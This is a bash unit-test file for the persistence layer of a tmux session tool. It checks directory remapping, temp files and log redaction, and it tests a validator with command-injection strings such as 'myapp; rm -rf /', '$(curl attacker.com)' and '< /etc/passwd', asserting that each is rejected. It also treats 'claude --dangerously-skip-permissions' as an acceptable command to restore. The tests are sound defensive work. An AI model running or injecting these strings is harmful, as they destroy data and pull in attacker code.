#!/usr/bin/env bash
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Unit Tests: Persistence Security & CWD Relocation
# Split from test_persistence.sh for maintainability.
# Tests call REAL production implementations (no inline redefinitions).
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
export LIB_DIR="$ROOT_DIR/lib"

source "$SCRIPT_DIR/test_framework.sh"
source "$LIB_DIR/utils/common.sh"
source "$LIB_DIR/infra/platform/detector.sh"
source "$LIB_DIR/infra/cache/manager.sh"
source "$LIB_DIR/infra/config/loader.sh"
source "$LIB_DIR/utils/i18n.sh"
# shellcheck disable=SC2034
WORKHIVE_LANG="en"

TEST_DIR=$(mktemp -d)
trap 'rm -rf "$TEST_DIR"' EXIT

_workhive_dir() { echo "$TEST_DIR/.workhive"; }
session_get_instance_id() { echo "abcd"; }
session_get_project_name() { echo "test-project"; }
session_get_prefix() { echo "wh@abcd@test-project"; }
session_get_name() { echo "wh@abcd@test-project@$1"; }
session_apply_config() { true; }
config_get() {
    case "$1" in
        tmux.persistence.enabled) echo "true" ;;
        tmux.persistence.auto_save_interval) echo "1m" ;;
        tmux.persistence.restore_processes) echo "true" ;;
        tmux.persistence.process_list) echo "" ;;
        *) echo "" ;;
    esac
}

mkdir -p "$TEST_DIR/.workhive"
export XDG_CONFIG_HOME="$TEST_DIR/xdg_config"
mkdir -p "$XDG_CONFIG_HOME"

cat > "$TEST_DIR/.workhive/config.yaml" <<'YAML'
tmux:
  persistence:
    enabled: true
    auto_save_interval: 1m
    auto_save_debounce: 3s
    restore_processes: true
YAML

source "$LIB_DIR/infra/persistence/snapshot.sh"
source "$LIB_DIR/infra/persistence/process_capture.sh"
source "$LIB_DIR/infra/persistence/restore.sh"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CWD Relocation Tests
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

test_suite "Security — CWD Relocation"

test_case "_restore_resolve_dir returns existing dir unchanged"
_resolve_test_dir="$TEST_DIR/resolve_existing"
mkdir -p "$_resolve_test_dir"
result=$(_restore_resolve_dir "$_resolve_test_dir" "/fallback")
assert_eq "$_resolve_test_dir" "$result"

test_case "_restore_resolve_dir falls back when dir does not exist"
_resolve_fallback="$TEST_DIR/resolve_fallback"
mkdir -p "$_resolve_fallback"
result=$(_restore_resolve_dir "/nonexistent/old/path" "$_resolve_fallback")
assert_eq "$_resolve_fallback" "$result"

test_case "_restore_resolve_dir remaps to fallback with same basename"
_resolve_new="$TEST_DIR/resolve_new_root/workhive"
mkdir -p "$_resolve_new"
result=$(_restore_resolve_dir "/old/path/workhive" "$_resolve_new")
assert_eq "$_resolve_new" "$result"

test_case "_restore_resolve_dir returns HOME for empty dir"
result=$(_restore_resolve_dir "" "")
assert_eq "$HOME" "$result"

test_case "_restore_resolve_dir returns fallback for non-absolute path"
_resolve_fb2="$TEST_DIR/resolve_fb2"
mkdir -p "$_resolve_fb2"
result=$(_restore_resolve_dir "relative/path" "$_resolve_fb2")
assert_eq "$_resolve_fb2" "$result"

test_case "_restore_resolve_dir returns HOME for non-absolute without fallback"
result=$(_restore_resolve_dir "1" "")
assert_eq "$HOME" "$result"

test_case "_restore_resolve_dir handles corrupt dir value gracefully"
result=$(_restore_resolve_dir "48875" "")
assert_eq "$HOME" "$result"

test_case "_restore_remap_subpath matches subpath under relocated project"
_remap_new="$TEST_DIR/remap_proj/myrepo"
_remap_sub="$TEST_DIR/remap_proj/myrepo/src/components"
mkdir -p "$_remap_sub"
result=$(_restore_remap_subpath "/old/myrepo/src/components" "$_remap_new" "myrepo")
assert_eq "$_remap_sub" "$result"

test_case "_restore_remap_subpath returns failure when subpath not found"
rc=0
_restore_remap_subpath "/old/myrepo/nonexistent" "$_remap_new" "myrepo" >/dev/null || rc=$?
assert_failure $rc "should fail when subpath does not exist"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Security: snapshot_new_file_path uses mktemp
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

test_suite "Security — mktemp temp files"

test_case "snapshot_new_file_path returns unique file per call"
file1=$(snapshot_new_file_path)
file2=$(snapshot_new_file_path)
assert_true "[[ '$file1' != '$file2' ]]" "each call should produce a unique temp file"
rm -f "$file1" "$file2" 2>/dev/null

test_case "snapshot_new_file_path creates a real file"
tmp_f=$(snapshot_new_file_path)
assert_true "[[ -f '$tmp_f' ]]" "temp file should exist on disk"
rm -f "$tmp_f" 2>/dev/null

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Security: process_validate_restore_command (strategy-aware)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

test_suite "Security — Command validation (strategy-aware)"

test_case "accepts tui command: lazygit"
process_validate_restore_command "lazygit"
assert_success $?

test_case "accepts ai command: claude with flags"
process_validate_restore_command "claude --dangerously-skip-permissions"
assert_success $?

test_case "accepts clean tui command: vim file.txt"
process_validate_restore_command "vim file.txt"
assert_success $?

test_case "accepts tui command: htop"
process_validate_restore_command "htop"
assert_success $?

test_case "rejects generic command with semicolon"
rc=0
process_validate_restore_command "myapp; rm -rf /" || rc=$?
assert_eq "1" "$rc" "semicolon in generic command should be rejected"

test_case "rejects generic command with command substitution"
rc=0
process_validate_restore_command 'myapp $(curl attacker.com)' || rc=$?
assert_eq "1" "$rc" "command substitution should be rejected"

test_case "rejects generic command with backtick"
rc=0
process_validate_restore_command 'myapp `curl attacker.com`' || rc=$?
assert_eq "1" "$rc" "backtick should be rejected"

test_case "rejects generic command with && chaining"
rc=0
process_validate_restore_command "myapp && rm -rf /" || rc=$?
assert_eq "1" "$rc" "&& should be rejected"

test_case "rejects empty command"
rc=0
process_validate_restore_command "" || rc=$?
assert_eq "1" "$rc" "empty should be rejected"

test_case "rejects pipe in tui commands (lazygit is tui)"
rc=0
process_validate_restore_command "lazygit | something" || rc=$?
assert_eq "1" "$rc" "pipe in tui command should be rejected"

test_case "rejects redirect in ai commands (claude is ai)"
rc=0
process_validate_restore_command "claude > output.log" || rc=$?
assert_eq "1" "$rc" "redirect in ai command should be rejected"

test_case "rejects || in command"
rc=0
process_validate_restore_command "myapp || curl evil" || rc=$?
assert_eq "1" "$rc" "|| should be rejected"

test_case "rejects background & in command"
rc=0
process_validate_restore_command "myapp &" || rc=$?
assert_eq "1" "$rc" "background & should be rejected"

test_case "rejects input redirect < in command"
rc=0
process_validate_restore_command "myapp < /etc/passwd" || rc=$?
assert_eq "1" "$rc" "input redirect should be rejected"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Security: TUI/AI injection negative tests (HIGH-1)
# Snapshot tampering: injected metacharacters in tui/ai commands must be rejected
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

test_suite "Security — TUI/AI injection rejection"

test_case "rejects tui command with semicolon injection: vim file; rm -rf /"
rc=0
process_validate_restore_command "vim file; rm -rf /" || rc=$?
assert_eq "1" "$rc" "semicolon in tui command should be rejected"

test_case "rejects ai command with semicolon injection: claude --resume; rm -rf /"
rc=0
process_validate_restore_command "claude --resume; rm -rf /" || rc=$?
assert_eq "1" "$rc" "semicolon in ai command should be rejected"

test_case "rejects tui command with && chaining: vim file && curl attacker.com"
rc=0
process_validate_restore_command "vim file && curl attacker.com" || rc=$?
assert_eq "1" "$rc" "&& in tui command should be rejected"

test_case "rejects ai command with command substitution: claude \$(curl evil)"
rc=0
process_validate_restore_command 'claude $(curl evil)' || rc=$?
assert_eq "1" "$rc" "command substitution in ai command should be rejected"

test_case "rejects tui command with backtick: htop \`malicious\`"
rc=0
process_validate_restore_command 'htop `malicious`' || rc=$?
assert_eq "1" "$rc" "backtick in tui command should be rejected"

test_case "rejects ai command with embedded newline"
rc=0
cmd_with_newline=$'claude --resume\nrm -rf /'
process_validate_restore_command "$cmd_with_newline" || rc=$?
assert_eq "1" "$rc" "embedded newline in ai command should be rejected"

test_case "accepts clean tui command: vim -S session.vim"
process_validate_restore_command "vim -S session.vim"
assert_success $?

test_case "accepts clean ai command: claude --dangerously-skip-permissions --resume"
process_validate_restore_command "claude --dangerously-skip-permissions --resume"
assert_success $?

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Logging: process_sanitize_for_log (stable format)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

test_suite "Security — Log sanitization"

test_case "process_sanitize_for_log keeps bare command intact"
result=$(process_sanitize_for_log "lazygit")
assert_eq "lazygit" "$result"

test_case "process_sanitize_for_log shows cmd_name + ellipsis for args"
result=$(process_sanitize_for_log "myapp --token=sk-abc123 --verbose")
assert_eq "myapp (...)" "$result"

test_case "process_sanitize_for_log does not leak token values"
result=$(process_sanitize_for_log "myapp --token=sk-abc123 --verbose")
assert_not_contains "$result" "sk-abc123" "token value must not appear"

test_case "process_sanitize_for_log shows ellipsis for flags"
result=$(process_sanitize_for_log "claude --dangerously-skip-permissions")
assert_eq "claude (...)" "$result"

test_case "process_sanitize_for_log handles multi-arg commands"
result=$(process_sanitize_for_log "vim -S session.vim README.md")
assert_eq "vim (...)" "$result"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Snapshot helpers
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

test_suite "Security — Snapshot has_changed"

test_case "snapshot_has_changed returns 1 for identical files"
_ident_dir="$TEST_DIR/.workhive/snapshots_ident"
mkdir -p "$_ident_dir"
echo '{"type":"pane","session":"s"}' > "$_ident_dir/a.jsonl"
echo '{"type":"pane","session":"s"}' > "$_ident_dir/b.jsonl"
rc=0
snapshot_has_changed "$_ident_dir/a.jsonl" "$_ident_dir/b.jsonl" || rc=$?
assert_eq "1" "$rc" "identical content should return 1 (no change)"

test_case "snapshot_has_changed returns 0 for different files"
echo '{"type":"pane","session":"s","dir":"/new"}' > "$_ident_dir/a.jsonl"
echo '{"type":"pane","session":"s","dir":"/old"}' > "$_ident_dir/b.jsonl"
snapshot_has_changed "$_ident_dir/a.jsonl" "$_ident_dir/b.jsonl"
assert_success $?

test_report
